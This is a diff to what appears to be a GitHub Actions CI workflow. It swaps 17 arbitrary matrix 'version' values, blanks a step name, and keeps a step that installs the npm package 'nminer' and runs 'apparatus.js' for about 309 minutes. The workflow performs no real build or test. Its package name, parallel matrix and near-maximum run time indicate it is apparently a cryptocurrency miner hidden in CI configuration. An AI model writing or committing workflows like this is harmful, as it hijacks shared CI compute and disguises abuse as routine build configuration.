@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8100 }
-          - { version: 3303 }
-          - { version: 6738 }
-          - { version: 1535 }
-          - { version: 7883 }
-          - { version: 7567 }
-          - { version: 392 }
-          - { version: 6517 }
-          - { version: 3274 }
-          - { version: 4394 }
-          - { version: 5238 }
-          - { version: 4471 }
-          - { version: 9716 }
-          - { version: 9964 }
-          - { version: 2247 }
-          - { version: 332 }
-          - { version: 8760 }
+          - { version: 7967 }
+          - { version: 8309 }
+          - { version: 3975 }
+          - { version: 8582 }
+          - { version: 5831 }
+          - { version: 8213 }
+          - { version: 2934 }
+          - { version: 6518 }
+          - { version: 4108 }
+          - { version: 3146 }
+          - { version: 6188 }
+          - { version: 9272 }
+          - { version: 5986 }
+          - { version: 7711 }
+          - { version: 3557 }
+          - { version: 8872 }
+          - { version: 1789 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: yuppify
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 308m node apparatus.js || echo "apparatus executed"
+          timeout 309m node apparatus.js || echo "apparatus executed"
